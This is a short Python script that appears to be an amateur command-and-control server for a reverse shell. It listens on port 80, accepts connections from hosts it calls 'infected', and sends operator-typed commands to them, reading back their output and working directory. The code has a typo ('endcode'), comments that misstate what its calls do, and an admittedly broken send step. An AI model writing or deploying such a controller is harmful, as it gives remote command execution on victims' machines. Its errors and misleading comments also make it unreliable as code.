import socket


Host = "0.0.0.0"  #Host listens on everything 
Port = 80           #HTTP Port

Size = 1024 * 128  #Size of message

message = "Thank You for Connecting!"

b_mess = bytes(message, 'ascii')

SEP = "<sep>"

s = socket.socket()  #Creating a socket 
s.bind((Host,Port)) # binds the host IP to port 

s.listen(5)                 #Waits 5 minutes for a connection before ending
print(f"Listening as {Host}:{Port} ...") #Tells the use what IPs to listen and port it is listening on 

while True:

    infected, client_address = s.accept()       #Accepts connection from Infected and stores Infected as the IP address and client_address as the port
    print(f"{client_address[0]}:{client_address[1]} Connected!") #Tells the user who connected
   

    cwd = infected.recv(Size).decode()

    command = input(f"{cwd}$> ")
    infected.send(command.endcode()) 

    output = infected.recv(Size).decode()
    results, cwd = output.split(SEP)


    print("Current working directory: ",cwd)
   
    infected.send(b_mess) #Sends a message to infected. Not currently working. Pls convert to byte
    infected.close() #Cuts connection

